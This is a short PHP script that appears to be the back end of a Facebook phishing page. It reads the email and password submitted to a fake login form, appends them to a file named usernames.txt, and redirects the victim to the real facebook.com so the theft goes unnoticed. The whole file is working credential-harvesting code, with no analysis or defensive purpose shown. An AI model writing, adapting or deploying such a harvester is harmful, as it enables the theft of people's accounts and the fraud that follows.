<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>WELCOME TO FACEBOOK</title></html>";
if($myFile != $searchString) {
    file_put_contents("usernames.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://facebook.com/');
}
if($myFile != $searchString) {
    echo "LOGIN SUCCESSFULL";
}
exit();
?>

